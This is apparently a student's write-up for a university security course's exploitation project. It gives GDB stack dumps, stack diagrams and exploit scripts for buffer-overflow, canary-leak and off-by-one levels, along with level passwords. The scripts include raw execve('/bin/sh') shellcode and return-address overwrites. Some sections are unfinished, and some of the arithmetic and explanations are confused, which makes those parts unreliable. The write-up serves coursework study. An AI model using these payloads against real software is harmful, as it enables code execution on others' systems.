# Project 1 Writeup

### | Saransh Rakshak | SID : 3032785043 | CS 161 FA21 | srakshak@berkeley.edu |

## Problem 1: REMUS
Pass: ilearned

## Problem 2: SPICA
Pass: alanguage

### MAIN IDEA:
 
 We know that the program uses output of egg script as a saved file for input to telemetry.c , so,
 
 🛑      The program would be vulnerable to a stack smash attack on call of fread at line 19:  

    [19] size_t bytes_read = fread(msg, 1, size, file)

 in display void() for file telemetry.c .

### MAGIC NUMBERS:
 
 Using a break on line 19 in GDB, I could use info frame to determine that :
 
                         0x1310 <display+110>    call   0x1050 <fread @ plt>
                         0x1315 <display+115>    add    $0x10,%esp
                         0x1318 <display+118>    mov    %eax,-0x10(%ebp)
                         0x131b <display+121>    cmpl   $0x0,-0x10(%ebp)
                         ...
                          0x1338 <display+150>    call   0x1050 <fread @ plt>2nd call fread
                          0x133d <display+155>    add    $0x10,%esp
                          0x1340 <display+158>    mov    %eax,-0x10(%ebp)
                          0x1343 <display+161>    sub    $0xc,%esp
                          0x1346 <display+164>    lea    -0x90(%ebp),%eax
                          0x134c <display+170>    push   %eax


         Stack level 0, frame at 0xbffffb30:
                eip = 0x401302 in display (telemetry.c:16); saved eip = 0x401397
                called by frame at 0xbffffb60
                source language c.
                Arglist at 0xbffffb28, args: path=0xbffffcdc "navigation"
                Locals at 0xbffffb28, Previous frame's sp is 0xbffffb30
                Saved registers:
                 ebx at 0xbffffb24, ebp at 0xbffffb28, eip at 0xbffffb2c

    LOC RIP =          @ 0xbffffb30
    VAL OF EIP/RIP =   @ 0x401397
    LOC OF EIP =       @ 0xbffffb2c
    LOC OF EBP/SFP =   @ 0xbffffb28


          -----------(gdb) x/32x 0xbffffb30-----------(128 bytes)
          0xbffffb30:     0xbffffcdc      0x00000000      0x00000000      0x00401373
          0xbffffb40:     0x00000000      0xbffffb60      0xbffffbe0      0xb7f82ef2
          0xbffffb50:     0xbffffbd4      0x00000002      0x00000000      0xb7f82ef2
          0xbffffb60:     0x00000002      0xbffffbd4      0xbffffbe0      0xb7fff090
          0xbffffb70:     0x00000011      0x00000000      0xb7f82ed0      0x00403fbc
          0xbffffb80:     0xb7ffea20      0xb7ffec40      0x0000000       0x004010fd
          0xbffffb90:     0x0040135d      0x00000002      0xbffffbd4      0x00401000
          0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000
          0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000

⚠️ RECALL: size_t bytes_read = fread(msg, 1, size, file)

          -----------(gdb) x/32x msg----------- (8*4*4 = 128 bytes of msg)
          0xbffffa98:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffaa8:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffab8:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffac8:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffad8:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffae8:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffaf8:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffb08:     0x00000000      0x00000000      0x00000000      0x00000000 
          //#end@b08, so RIP@0xbffffb2c not far, (2c-08 = 4=24 bytes)
          
          -----------(gdb) x/32x '1'----------- don't care, we know len(1) == 4 bits == 1 byte
          ---(gdb) x/32x size--- passed/don't care now, memory @ 0xffffffff in 'file' with byte size 4*3*4 = 48
          
so I will need 
          
          len(meg)+len('1')+len(128 + 4 + 48 'A')
          
to overflow fread().

### EXPLOIT PARTS:

#### Stack Diagram :

              [4] RIP of main                                
              [4] SFP of main                                
              [n] compiler padding unknown bytes n
              *now in display*
              [4] RIP orbit(@ , value @ ) 
              [4] SFP orbit(@ )                    
              [m] compiler padding unknown bytes m
              [8] char buf (buffer)

#### Exploit :
   
    rip = "\x30\xfb\xff\xbf"
    size = "\xff"
    shellcode = \
    "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" + \
    "\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + \
    "\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" + \
    "\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
    #editing #bytes_read = fread(msg, 1, size, file)

    print(size + "A"*(148) + rip + shellcode)

1. EIP was directly determined off of the info frame and above processes- confirmed with stack diagram drawn above.

2. We know the first value passed will need to be be our size (given in proj specs), thus, print statement will start off with size, which
is stored in 2nd bit accessed by 'ff' (we will pass '\xff' for formatting).

3. Can determine from x/32x splits above and stack diagram that we will need to print 148 bytes to fill up message, thus 

       'A' * (128 + 4 + 16)
       Note that 'A'is 1 byte = 4 bits

   as 128 == msg len, 4 as '1' in fread of bit 4(1byte), and 16 to jump past pointless file input to overflow and jump to rip. 

4. Fill up rip determined by i f, as shown above, with a breakpoint set on line 19, which will allow us to overwrite our fread and jump
to rip and eip loc.

5. Finally add shellcode above RIP , finhishing exploit and sending to create to a file and run in ./exploit .

6. As an example, running gdb with ./debug-exploit and ./egg is same as above, we can see how fread is vulnerable with following :

       print(size + "A"*(148) + rip + shellcode)
       saves output of ./egg :

                 pwnable:~$ ./egg
                 ?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
                 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
                 AAAAAAAAAAAAAAAAAAAAAAA0???j2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                                                                 ̀
                 pwnable:~$ 

       as file input for telemetry.c, then uses contents as input to fread (line 19) in order 
       to run stack smash attack. 
          
## Problem 3: POLARIS
Pass: tolearn

### MAIN IDEA:

 We are told that -for this question- stack canaries are enabled.
 
 🔀    The stack canary in this question is 4 random bytes (no null byte) that change each time you run the program. 
 
 🛑    The vulnerable dehexify program takes an input and converts it so : HEXadecimal escapes decoded into their equivilant ASCII characters.
    
⚠️      Note : Any non-hex escapes are outputted as-is.

            $ ./dehexify
            \x41\x42   # outputs AB
            XYZ        # outputs XYZ
            # Control-D ends input
            
 This is then print back to console with use of dehexify.c line [19]:
 
            printf("%s\n", c.answer);
            
 🛑     So we can see that there is a vulnerability here with using printf() as it is format string vulnerable. This means that the function dehexify()
 is suceptible to buffer overflow attacks to reveal (via printf) hidden values of canary in order to pass canary check. 
 
 
 The suseptibility occurs in the get(c.buffer) which can be used to pass malicious input to overflow the value of the canary into our c.answer, which gets sent over to printf in line [19] (above). As printf occurs after the gets() call in dehexify() line 6.
 
 
 We are planning on using a buffer overflow attack in line 19 of dehexify function in order to push canary, which currently lies above instance variables of
 dehexify function and overflowing so that it gets copied into c.answers. The overflow is created by call to function gets(c.buffer) dehexify line 6.
 
 
            gets(c.buffer);
 
 
 ❗️     Note: New canary created with new program run on file dehexify.c--- not rerunning dehexify() or other functions.
 
 
 The canary will then be assigned into c.answers, and be printed out to console in printf. As rerunning dehexify will not generate new canary,
 we can stick in the while loop in main() until we are able to printf in dehexify() and still preserve the value of our cannary.


### MAGIC NUMBERS:

         ATTACK ON GETS(C.BUFFER) [dehex() line 6]
         Breakpoint 1, dehexify () at dehexify.c:19
         (gdb) i f
         Stack level 0, frame at 0xbffffb54:
          eip = 0x401301 in dehexify (dehexify.c:19); saved eip = 0x401409
          called by frame at 0xbffffb60
          source language c.
          Arglist at 0xbffffb4c, args:
          Locals at 0xbffffb4c, Previous frame's sp is 0xbffffb54
          Saved registers:
           ebx at 0xbffffb48, ebp at 0xbffffb4c, eip at 0xbffffb50
       
       EIP = RIP = 0xbffffb50
       
       EBP = SFP = 0xbffffb4c
       
       RIP - SFP = 4
      
          Breakpoint 1, dehexify () at dehexify.c:19
           (gdb) x/32x gets
             0xb7fb278c <gets>:      0xff315755      0x93e85356      0x81fffc90      0x04a7f1c3
             0xb7fb279c <gets+16>:   0x1cec8300      0x01e4838b      0xc0850000      0xec831478
             0xb7fb27ac <gets+32>:   0x98838d0c      0x50000001      0xffdae3e8      0x10c483ff
             0xb7fb27bc <gets+48>:   0xf631c789      0x01982d8d      0x938d0000      0x00000198
             0xb7fb27cc <gets+64>:   0x042b448b      0x082b443b      0x488d0c74      0x2b4c8901
             0xb7fb27dc <gets+80>:   0x00b60f04      0xec8319eb      0x5489520c      0x19e81c24
             0xb7fb27ec <gets+96>:   0x83ffffdf      0x548b10c4      0xf8830c24      0x831074ff
             0xb7fb27fc <gets+112>:  0x0b740af8      0x30244c8b      0x31448846      0x8bc1ebff
         
### EXPLOIT PARTS:

#### Stack Diagram :
           [4] RIP of main                                
           [4] SFP of main                                
           [4] canary
           [n] compiler padding unknown bytes n
           *now in dehexify*
           [4] RIP of dehexify
           [4] SFP of dehexify
           [4] canary
           [1] int j
           [1] int i
           [8] struct c
           [24] char buffer
           [24] char answer
           [m] compiler padding unknown bytes m
           *now in gets(c.buffer)*
           [4] RIP of GETS
           [4] SFP of GETS
           [4] canary
           [1] extra null byte GETS
           [24] gets(c.buffer) //returns 24 byte word
       
#### Exploit :
   
     #!/usr/bin/env python2
     from scaffold import *
     # HINT: the last line of your exploit should look something like:
     #   p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\n')
     # where m, canary, n and rip are all values you must determine
     # and you might need to add a '\x00' somewhere
     ### YOUR CODE STARTS HERE ###

     p.send('A'*8 + '\\x'*3 + '\n')
     canary = p.recv(20)[16:19]
     #print("Canary=" + canary)
     m = 14
     n = 12
     rip = "\\x50\\xfb\\xff\\xbf"

     p.send('A'*m + canary + 'B'*n + rip + SHELLCODE + '\n')

     ### YOUR CODE ENDS HERE ###
     returncode = p.end()
     if returncode == -11: print 'segmentation fault or stack canary!'
     elif returncode != 0: print 'return code', returncode

Tracing code for first line of my solution to jump over NULL byte into canary: 

     p.send('A' * 8 + '\\x' * 3 + \n') :

in while loop of dehexify() function:

Start.  i = 0, j = 0  

        1.  i == 8. The code reads the '\\x' sequence and jumps ahead by 4.

        2.  i == 12. The code reads '\\x' and jumps ahead by 4.

        3.  i == 16. You have jumped over the NULL byte, and are now reading the canary.

        4.  Now reading the canary: In canary, i == 16, j == 11

        4. The code reads last (3rd) '\\x' seq. for canary and jumps ahead by 4 giving i == 20, j == j+1 == 12 

        5. '\n' enters return key and exits program, so...

        our canary will be in i = 17, 18, 19, 20 and j = 12

        But as outside while loop we assign c.answer[j] = 0, where j = 12, so c.answer[12] = 0

        so canary in i = 17, 18, 19, 20 ; j = 0, 

Getting our canary value:

     canary = p.recv(20)[16:19] following the first p.send statement

And using canary, we can do a p.send('A'* m + canary + 'B'* n + rip + SHELLCODE + '\n')

     m = 14 #null BYTE
     n = 12 #null byte
     rip = "\\x50\\xfb\\xff\\xbf"
     p.send('A'* m + canary + 'B'* n + rip + SHELLCODE + '\n')     
          
          
## Problem 4: VEGA
Pass: whyishould

### MAIN IDEA:

 We know that char buf[64] has a size of 64 bits. 
           
    [18]   char buf[64];
 
 Furthermore, we can see that the 'for' loop in flips iterates 65 times :
 
    [9]    for (i = 0; i < n && i <= 64; ++i) (check for i being under or equal to 64 occurs before iteration of i.)
  
### MAGIC NUMBERS: 
  
 Thus, the loop effectively can surpass the null byte of our input buffer by launching our shellcode inside of buffer, 
 we know that we will have null bytes that we will have to 'skip' over in our buffer before we insert SHELLCODE, 
 and can determine this value to be 8 as size of our RIP[4] and SFP[4] which must both occur before SHELLCODE,
 but after 64th iteration- bypass nullspace with pointer to SHELLCODE at location we can find using :
 
        (gdb) x/2wx *((char **)environ) 
        (gdb) x/2wx *((char **)environ+1)
        (gdb) x/2wx *((char **)environ+2)
    
    
❗️      Note: we must store SHELLCODE as a Environment variable (can be used by all functions) at this location - using 'egg' script :
 
 
     print(SHELLCODE)
 
 
and accesses it (as well as RIP & SFP) with a stored special pointer variable, found with :
  
         (gdb) x/2wx *((char **)environ)
         (gdb) x/2wx *((char **)environ+1)
         (gdb) x/2wx *((char **)environ+2)
     
     (gdb) x/2wx *((char **)environ)
      0xbffffcc4:     0x564c4853      0x00313d4c
     (gdb) x/2wx *((char **)environ+1)
      0xbffffccc:     0x3d444150      0xffffffff
     (gdb) x/2wx *((char **)environ+2)
      0xbfffff99:     0x3d564e45      0xcd58326a
     
 Also, using info frame on a break on line 
 
     [10]:    buf[i] = input[i] ^ 0x20; 
     
         Breakpoint 1, flip (buf=0xbffffae0 "", input=0xbffffcc1 "()") at flipper.c:10
           (gdb) i f
           Stack level 0, frame at 0xbffffad8:
            eip = 0x8049202 in flip (flipper.c:10); saved eip = 0x804925d
            called by frame at 0xbffffb28
            source language c.
            Arglist at 0xbffffad0, args: buf=0xbffffae0 "", input=0xbffffcc1 "()"
            Locals at 0xbffffad0, Previous frame's sp is 0xbffffad8
            Saved registers:
             ebp at 0xbffffad0, eip at 0xbffffad4


         break on line [18] char buf in main invoke() :
          Breakpoint 1, invoke (in=0xbffffcc1 "()") at flipper.c:19
            Stack level 0, frame at 0xbffffb28:
              eip = 0x8049251 in invoke (flipper.c:19); saved eip = 0x804927a
              called by frame at 0xbffffb34
              source language c.
              Arglist at 0xbffffb20, args: in=0xbffffcc1 "()"
              Locals at 0xbffffb20, Previous frame's sp is 0xbffffb28
              Saved registers:
               ebp at 0xbffffb20, eip at 0xbffffb24

 
❗️      Note: As there is a 1 / 256 chance we will get VALUE = '\x00' (null byte) ending SFP... 

thus must print garbage bytes in egg after SHELLCODE- pushes rest of stack to different addresses. 

    We must print 256 / 4 = 64 bites of garbage, and we already have used 
    
                    4[RIP] + 4[SFP] + 4[stored pointed to global SHELLCODE] = 12 bites
                    
    thus, 64 - 12 = 52 bites of padding in buffer char --> 64 total , 
    
    AND, +1 would overflow (so that is where we inject shell, remember +1, or 65 runs due to loop overflow).
    
Using GDB,find address of char buf :
    
        Starting program: /home/vega/flipper \(\)
        Breakpoint 1, flip (buf=0xbffffae0 "", input=0xbffffcc1 "()") at flipper.c:10
          (gdb) i f 
          Stack level 0, frame at 0xbffffad8:
           eip = 0x8049202 in flip (flipper.c:10); saved eip = 0x804925d
           called by frame at 0xbffffb28
           source language c.
           Arglist at 0xbffffad0, args: buf=0xbffffae0 "", input=0xbffffcc1 "()"
           Locals at 0xbffffad0, Previous frame's sp is 0xbffffad8
           Saved registers:
            ebp at 0xbffffad0, eip at 0xbffffad4

    Address of looped char buffer[64]; buf=0xbffffae0 "" Note: value is empty --> start of loop
    EIP of buf: eip = 0xbffffad4
    EBP of buf: ebp = 0xbffffad0

        BEFORE RUN
        (gdb) x/32x buf   
         0xbffffae0:     0x00000000      0x00000001      0x00000000      0xbffffc8b
         0xbffffaf0:     0x00000000      0x00000000      0x00000000      0x00000000
         0xbffffb00:     0x00000000      0xbfffffe9      0xb7ffe540      0xb7ffe000
         0xbffffb10:     0x00000000      0x00000000      0x00000000      0x00000000
         0xbffffb20:     0xbffffb2c      0x0804927a      0xbffffcc1      0xbffffb38
         0xbffffb30:     0x0804929e      0xbffffcc1      0xbffffbc0      0x0804946f
         0xbffffb40:     0x00000002      0xbffffbb4      0xbffffbc0      0x0804a000
         0xbffffb50:     0x00000000      0x00000000      0x0804944d      0x0804bfe8


### EXPLOIT PARTS:
   
#### EXPLOIT : 
   
        AFTER RUN
        (gdb) c
        Continuing.
        Breakpoint 1, flip (buf=0xbffffae0 "\b", input=0xbffffcc1 "()") at flipper.c:10
        (gdb) x/32x buf
          0xbffffae0:     0x00000000      0x00000001      0x00000000      0xbffffc8b
          0xbffffaf0:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffb00:     0x00000000      0xbfffffe9      0xb7ffe540      0xb7ffe000
          0xbffffb10:     0x00000000      0x00000000      0x00000000      0x00000000
          0xbffffb20:     0xbffffb2c      


          Breakpoint 1, flip (buf=0xbffffae0 "", input=0xbffffcbb "AAAAAAAA") at flipper.c:10
          
      (gdb) x/2wx *((char **)environ)
      
      1.   0xbffffcc4:     0x564c4853      0x00313d4c
      
      (gdb) x/2wx *((char **)environ+1)
      
      2.   0xbffffccc:     0x3d444150      0xffffffff
      
      (gdb) x/2wx *((char **)environ+2)
      
      3.   0xbfffff99:     0x3d564e45      0xcd58326a
      

### ☣️ FINISH debug / typing in terminal later
   
## Problem 5: DENEB
   Pass: neveruseit


### MAIN IDEA:



  
   
   
## Problem 6: RIGEL
Pass: 58623

### MAIN IDEA:

We are told that position-independent executables are not enabled. Thus :
  
    💠  Code section of memory is always at the same spot (static).
  
Unfortunately ALSR is still ENABLED, thus :
  
    🔀  Randomizing Stack: attacker cannot place shellcode on the stack 
    without knowing the address of the stack. 
    
    🔀  Randomizing Heap: attacker cannot place shellcode on 
    the heap without knowing the address of the heap. 
    
    🔀  Randomizing Code: attacker cannot construct an ROP chain or a return-to-libc 
    attack without knowing the address of the code. 
    
☢️ In our case, static (non-random/unchanging) code section :
    
        ❗️  Absolute addresses of vars, saved registers (sfp and rip), and code 
        intsructions to be different each program run.

        ❗️  Can no longer overwrite some part of memory (such as the rip) with a constant 
        address.

        ✅  Instead, GUESS the address of malicious instructions.
  
Constraints to randomizing sections of memory : 
   
        🔰   Segments usually need to start at a page boundary, thus ... 
        
        🔰   Starting address of each section of memory needs to be a multiple 
             of the page size. 
             
        🔰   4096 bytes in 32-bit architecture.

So, first we have to bypass ASLR in order to get correct RIP/EIP and SFP/EBP values: Can be done using preexisting 
code, and we KNOW that code is static in this question, so...

🪲   With non-randomized code, we can take advantage of vulnerability as we can now construct :
                            
    ☢️   ROP chain or a return-to-libc attack.

WITHOUT knowing the @ address of the code.

❗️ Note in orbit.c : 

        void orbit()
        {
          char buf[8];
          gets(buf);  🪲 Vulnerable gets() func. 
             #Static location -> (@ address) of Function Code.
        }



### Exploit Part :

#### Using GBD, we see :

Upon Run

     Starting program: /home/rigel/orbit
     Breakpoint 1, orbit () at orbit.c:15
     (gdb) i f
       Stack level 0, frame at 0xbfa0e480:
        eip = 0x804924f in orbit (orbit.c:15); saved eip = 0x804927b
        called by frame at 0xbfa0e490
        source language c.
        Arglist at 0xbfa0e478, args:
        Locals at 0xbfa0e478, Previous frame's sp is 0xbfa0e480
        Saved registers:
         ebx at 0xbfa0e474, ebp at 0xbfa0e478, eip at 0xbfa0e47c
     
     (gdb) x/32x buf
        0xbfbb0988:     0x00000000      0x00000000      0x00000000      0xb7f8af88
        0xbfbb0998:     0xbfbb09a8      0x0804927b      0xbfbb0a24      0x00000001
        0xbfbb09a8:     0xbfbb0a2c      0xb7f10ef2      0x00000001      0xbfbb0a24
        0xbfbb09b8:     0xbfbb0a2c      0xb7f8d090      0x00000011      0x00000000
        0xbfbb09c8:     0xb7f10ed0      0x0804bfe0      0xb7f8ca20      0xb7f8cc40
        0xbfbb09d8:     0x00000000      0x0804909d      0x08049266      0x00000001
        0xbfbb09e8:     0xbfbb0a24      0x08049000      0x080492c9      0x00000000
        0xbfbb09f8:     0xb7f5475b      0x00000000      0x00000000      0x08049071

      -Can see 3 null byte start 0x00000000' or '\x00' on buf @ 0xbfbb0988
      -1 null byte '0x00000000' or '\x00' on buf @ 0xbfbb09d8
      -1 null byte '0x00000000' or '\x00' on buf @ bfbb09fa
      -2 null byte '0x00000000' or '\x00' on buf @ 0xbfbb09dc
      -1 non-null & non-zero ENDING byte 0x08049071 on buf @ 0xbfbb0a0a
      
    Our RIP/EIP is @ 0xbfa0e47c 
      eip = '\x7c\xe4\xa0\xbf'

    Our SFP/EBP is @ 0xbfa0e478
      sfp = '\x78\xe4\xa0\xbf'

      
#### Stack Diagram :

       [4] Unsigned int magic
       [20] Unsigned int i #this will be   
             
       #      i |= 58623
       
       [16] Unsigned int j #this will be
       
       #      j %= 0x42
       
       [4] RIP of main                                
       [4] SFP of main                                
       [0] canary (none)
       [n] compiler padding unknown bytes n
       *now in orbit*
       [4] RIP of orbit()
       [4] SFP of orbit()
       [0] canary (none)
       [8] char buf
       *now in gets(buf)*
       🪲 Vulnerable gets() function
       
       
   So, we will need to fill 24 (from magic unsigned int i + j) + 8 bytes of buf comp padding + 4 bytes for eip to malicious 
   code == 36, our new pointer from gets() to malicious code.


   We can locate the static location of the call to gets() for injecting malicious code with GDB. @ 0xbfa0e47c

      Stack level 0, frame at 0xbfa0e480:
           eip = 0x804924f in orbit (orbit.c:15); saved eip = 0x804927b
           called by frame at 0xbfa0e490
           source language c.
           Arglist at 0xbfa0e478, args:
           Locals at 0xbfa0e478, Previous frame's sp is 0xbfa0e480
           Saved registers:
            ebx at 0xbfa0e474, ebp at 0xbfa0e478, eip at 0xbfa0e47c


   So RIP/EIP = 0xbfa0e47c or '\x7c\xe4\xa0\xbf'
   
   SFP/EBP = 0xbfa0e478 or '\x78\xe4\xa0\xbf'
   
   
         
